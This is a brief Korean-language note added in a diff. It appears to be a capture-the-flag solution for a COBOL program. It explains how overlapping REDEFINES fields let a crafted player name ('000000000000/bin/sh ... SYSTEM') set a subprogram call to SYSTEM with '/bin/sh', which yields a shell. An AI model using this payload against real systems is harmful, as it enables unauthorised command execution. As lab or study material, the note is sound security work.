@@ -1,0 +1,7 @@
+1. redefines로 자료형을 뭉갤 수 있는것을 이용, subprgname, subprgarg를 SYSTEM, '/bin/sh'로 각각 설정
+2. register player2 Name '000000000000/bin/sh             SYSTEM'
+3. send match
+4. END
+
+COBOL의 system은 외부 프로그램 실행해줌
+
